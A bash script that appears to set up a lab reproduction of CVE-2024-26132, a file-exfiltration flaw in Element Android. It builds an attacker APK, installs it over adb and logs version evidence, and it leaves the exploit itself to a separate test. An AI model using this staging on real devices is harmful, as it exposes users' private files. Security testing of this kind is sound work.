#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$SCRIPT_DIR/../.."
EVIDENCE_FILE="$ROOT_DIR/exploit_evidence.txt"
MALICIOUS_APP_DIR="$SCRIPT_DIR/malicious_app"
APK_PATH="$MALICIOUS_APP_DIR/dist/element-exfiltrate.apk"
ATTACKER_PKG="com.example.elementexfiltrate"
ELEMENT_PKG="im.vector.app"

# Debug function
debug_log() {
    echo "[DEBUG] $(date '+%H:%M:%S') - $1" >&2
}

# Check if Element is installed (release or debug)
debug_log "Checking if Element package is installed..."
if adb shell pm list packages | grep -q "^package:${ELEMENT_PKG}$"; then
    debug_log "Element package found: ${ELEMENT_PKG}"
elif adb shell pm list packages | grep -q "^package:${ELEMENT_PKG}.debug$"; then
    ELEMENT_PKG="${ELEMENT_PKG}.debug"
    debug_log "Element debug package found: ${ELEMENT_PKG}"
else
    echo "ERROR: Element package '${ELEMENT_PKG}' (or debug variant) is not installed!"
    echo "Available packages containing 'vector':"
    adb shell pm list packages | grep -i vector || echo "None found"
    echo "This script cannot continue without Element installed."
    exit 1
fi

# Build the malicious APK
debug_log "Building malicious APK..."
cd "$MALICIOUS_APP_DIR"
if [ -f "build.sh" ]; then
    debug_log "Running build.sh to create malicious APK..."
    if ./build.sh; then
        debug_log "APK build completed successfully"
    else
        echo "ERROR: Failed to build malicious APK"
        exit 1
    fi
else
    echo "ERROR: build.sh not found in malicious_app directory"
    exit 1
fi
cd - >/dev/null

# Uninstall any existing malicious APK
debug_log "Uninstalling any existing malicious APK..."
adb uninstall "$ATTACKER_PKG" >/dev/null 2>&1 || true

# Check if the malicious APK was built
debug_log "Checking if malicious APK exists..."
if [ ! -f "$APK_PATH" ]; then
    echo "ERROR: Attacker APK not found at: $APK_PATH"
    exit 1
fi
debug_log "Malicious APK found: $APK_PATH ($(ls -lh "$APK_PATH" | awk '{print $5}'))"

# Install the malicious APK
debug_log "Installing malicious APK..."
if ! adb install "$APK_PATH" >/dev/null 2>&1; then
    echo "ERROR: Failed to install malicious APK"
    adb install "$APK_PATH" 2>&1 | head -10
    exit 1
fi
debug_log "Malicious APK installation completed"

# Verify package is installed
debug_log "Verifying malicious package is installed..."
if ! adb shell pm list packages | grep -q "^package:${ATTACKER_PKG}$"; then
    echo "ERROR: Malicious package installation failed"
    exit 1
fi
debug_log "Malicious package verified: ${ATTACKER_PKG}"

# Malicious app is now installed and ready
# Test will create the room and launch the file exfiltration exploit
debug_log "Malicious app installed - test will create room and run file exfiltration exploit"
EXPLOIT_SUCCESS=true

# Get Android version info
debug_log "Getting Android version info..."
ANDROID_VERSION=$(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r' || echo "unknown")
ANDROID_SDK=$(adb shell getprop ro.build.version.sdk 2>/dev/null | tr -d '\r' || echo "unknown")

# Get Element version
ELEMENT_VERSION=$(adb shell dumpsys package "$ELEMENT_PKG" 2>/dev/null | sed -n 's/.*versionName=\([^ ]*\).*/\1/p' | tr -d '\r' || echo "unknown")

# Create evidence file
debug_log "Creating evidence file..."
: > "$EVIDENCE_FILE"
echo "CVE_2024_26132_MALICIOUS_APP_INSTALLED=true" >> "$EVIDENCE_FILE"
echo "ELEMENT_VERSION=${ELEMENT_VERSION:-unknown}" >> "$EVIDENCE_FILE"
echo "ANDROID_VERSION=${ANDROID_VERSION:-unknown}" >> "$EVIDENCE_FILE"
echo "ANDROID_SDK=${ANDROID_SDK:-unknown}" >> "$EVIDENCE_FILE"
echo "MALICIOUS_APP_PACKAGE=${ATTACKER_PKG}" >> "$EVIDENCE_FILE"
echo "EXPLOIT_WILL_BE_RUN_BY_TEST=true" >> "$EVIDENCE_FILE"

# Create log file
LOG_FILE="$SCRIPT_DIR/element_exfiltrate_log.log"
debug_log "Creating vulnerability scenario log..."

{
    echo "CVE-2024-26132 Element Android File Exfiltration Vulnerability Scenario Setup"
    echo "Timestamp: $(date -u +%FT%TZ)"
    echo "Android: $ANDROID_VERSION (API $ANDROID_SDK)"
    echo "Attacker Package: $ATTACKER_PKG"
    echo "Target Package: $ELEMENT_PKG"
    echo "Element Version: $ELEMENT_VERSION"
    echo ""
    echo "--- Vulnerability Details ---"
    echo "CVE-2024-26132: FileProvider misconfiguration allowing:"
    echo "1. File exfiltration via IncomingShareActivity + MultiPickerFileProvider"
    echo ""
    echo "--- Setup Status ---"
    echo "Malicious app installed: YES"
    echo "Room creation and exploit will be executed by test_confidentiality.py"
    echo ""
    echo "--- Test Evidence ---"
    cat "$EVIDENCE_FILE"
} > "$LOG_FILE"

echo ""
echo "🚨 CVE-2024-26132 Element Android File Exfiltration Scenario Setup Complete!"
echo "============================================================================"
echo "Malicious App: $ATTACKER_PKG"
echo "Evidence File: $EVIDENCE_FILE"
echo "Test Log: $LOG_FILE"
echo ""
echo "✅ Malicious app installed successfully"
echo "📱 Test will create room and run file exfiltration exploit"

debug_log "CVE-2024-26132 scenario setup completed successfully"
